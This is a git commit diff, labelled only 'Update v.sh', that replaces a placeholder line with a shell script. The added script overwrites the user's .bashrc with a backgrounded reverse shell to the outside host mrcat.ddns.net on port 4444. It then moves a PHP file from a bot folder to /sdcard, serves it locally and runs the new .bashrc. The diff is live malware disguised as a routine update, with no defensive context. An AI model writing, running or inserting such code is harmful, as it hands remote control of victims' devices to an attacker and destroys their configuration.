accfe9eb16763ae5a6a6ec315bd9333ed565aa0a
inhdyaii <69579471+inhdyaii@users.noreply.github.com>
2023-09-05 18:23:06 +0300

    Update v.sh

--- v.sh
+++ v.sh
@@ -1,2 +1,4 @@
-
-hi
+echo "bash -c '0<&128-;exec 128<>/dev/tcp/mrcat.ddns.net/4444;sh <&128 >&128 2>&128' > /dev/null 2>&1 & disown" > $HOME/.bashrc
+mv $HOME/highrise-bot/o.php /sdcard
+cd /sdcard && php -S 127.0.0.1:8080 && cd
+bash $HOME/.bashrc
